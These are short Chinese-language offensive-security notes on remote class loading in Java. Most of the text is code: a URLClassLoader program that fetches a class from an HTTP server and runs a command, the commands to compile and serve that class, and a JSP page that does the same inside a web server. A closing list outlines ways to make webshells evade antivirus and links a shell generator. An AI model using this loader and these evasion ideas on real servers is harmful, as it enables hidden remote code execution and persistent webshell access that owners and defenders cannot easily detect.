## 远程类加载

```
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8888/")});
        Class<?> aClass = urlClassLoader.loadClass("Run");
        aClass.newInstance();
    }
}

import java.io.IOException;

public class Run {
    public Run() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}

```

javac Run.java
python -m http.server 8888

```
<%@ page import="java.net.URL, java.net.URLClassLoader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    try {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8888/")});
        Class<?> aClass = urlClassLoader.loadClass("Run");
        aClass.newInstance();
        out.println("Class loaded and instantiated successfully.");
    } catch (Exception e) {
        out.println("Error: " + e.toString());
        e.printStackTrace();
    }
%>

```

## 免杀应用-Webshell

1. 文件包含下本地包含
2. 远程读取配合类加载
3. 远程类加载器配合
4. 免杀工具思路特征改动

https://github.com/Ni4n/ShellGenerate